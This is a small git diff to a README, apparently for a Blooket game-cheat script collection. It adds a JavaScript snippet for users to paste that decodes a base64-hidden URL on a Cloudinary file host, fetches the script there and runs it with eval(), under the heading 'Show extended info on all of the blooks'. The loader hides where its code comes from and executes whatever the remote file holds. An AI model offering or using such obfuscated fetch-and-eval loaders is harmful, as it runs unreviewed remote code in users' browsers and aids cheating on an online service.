@@ -16,6 +16,9 @@ fetch(atob('aHR0cHM6Ly9yZXMuY2xvdWRpbmFyeS5jb20vZGt1cW1wdmJvL3Jhdy91cGxvYWQvdjE2
 ### Show extended info on all of the blooks
 </br>
 
+```js
+fetch(atob('aHR0cHM6Ly9yZXMuY2xvdWRpbmFyeS5jb20vZGt1cW1wdmJvL3Jhdy91cGxvYWQvdjE2MzgyMzE0NzYvYmxvb2tJbmZvRXh0ZW5kZXIuanM=')).then((res) => res.text().then((t) => eval(t)))
+```
 
 # spoofer.js
 ## Blooks
